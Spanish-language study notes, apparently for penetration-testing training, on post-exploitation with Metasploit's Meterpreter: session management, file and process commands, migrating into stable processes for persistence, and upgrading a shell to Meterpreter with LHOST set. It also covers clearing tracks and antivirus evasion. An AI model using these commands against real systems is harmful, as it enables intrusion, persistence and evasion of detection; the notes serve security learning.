----
##  **Post-explotación**

La **post-explotación** se refiere a todas las acciones realizadas **una vez obtenido el acceso inicial** a un sistema comprometido.  
El objetivo no es solo “entrar”, sino **exprimir el sistema**.

### Técnicas principales:

- **Local enumeration** → recopilar información del sistema comprometido
- **Privilege escalation** → elevar privilegios (user → root / SYSTEM)
- **Dumping hashes** → extraer hashes de contraseñas
- **Persistence** → mantener acceso tras reinicios
- **Clearing your tracks** → borrar rastros (logs, historial, etc.)
- **Pivoting** → usar el sistema comprometido como puente hacia otros

##  **Meterpreter**

**Meterpreter** es un **payload avanzado y multifuncional** de Metasploit que:

- Se ejecuta **en memoria** (no toca disco → más sigiloso 🥷)
- Opera mediante **DLL injection**
- Es más difícil de detectar por antivirus tradicionales
### Características clave:

- Se comunica a través de un **stager socket**
- Proporciona un **intérprete de comandos interactivo**
- Permite:
    - Ejecución de comandos del sistema
    - Navegación por el sistema de archivos
    - Keylogging
    - Captura de información del sistema
    - Carga de **scripts personalizados** y **plugins**

En resumen: no es una shell cualquiera, es una **navaja suiza ofensiva**.
## **msfconsole – Gestión de sesiones**

### Comandos básicos:

`workspace sessions`
### Gestión de sesiones:

`sessions -l                  # Lista sesiones activas` 
`sessions -i 1                # Interactúa con la sesión 1 
`sessions -C sysinfo -i 1     # Ejecuta comando en sesión concreta 
`sessions -k 1                # Mata la sesión 
`sessions -n nombre 1         # Renombra la sesión 
`sessions -u 1                # Upgrade automático a meterpreter`
##  **Comandos básicos en Meterpreter**

### Sistema de archivos:

`pwd cd ls cat archivo edit archivo download archivo /ruta_local   # La ruta local es opcional mkdir carpeta rmdir carpeta`

### Búsquedas:

`search -d /usr/bin -f *backdoor*` -> busca en el directorio 
`search -f *.jpg` -> busca en todo el sistema
### Información del sistema:

`getenv PATH getuid sysinfo 
`checksum md5 /bin/bash` -> crea un hash de /bin/bash

## 🐚 **Shell desde Meterpreter**

`shell`

Dentro de la shell:

`/bin/bash -i`

### Control de la shell:

- `Ctrl + C` → termina el comando actual
- `Ctrl + Z` → envía la sesión a segundo plano
- `background` → vuelve a Meterpreter
## ⚙️ **Procesos y migración**

`ps                    # Lista procesos `
`migrate PID           # Migra a otro proceso (clave para estabilidad) `
`execute -f ifconfig   # Ejecuta un proceso nuevo`

📌 **Tip realista**: migrar a procesos estables (explorer.exe, svchost, etc.) mejora persistencia y evita caídas.

## 🚀 **Upgrading Command Shell → Meterpreter**

### Método manual:

1. Obtienes una **command shell**
2. Pulsas:

`Ctrl + Z`

3. Buscas el módulo:

`search shell_to_meterpreter`

4. Configuras:

`set LHOST tu_ip set SESSION 1 run`
### Método rápido (bendito sea):

`sessions -u 1`

Automático, limpio y sin drama.
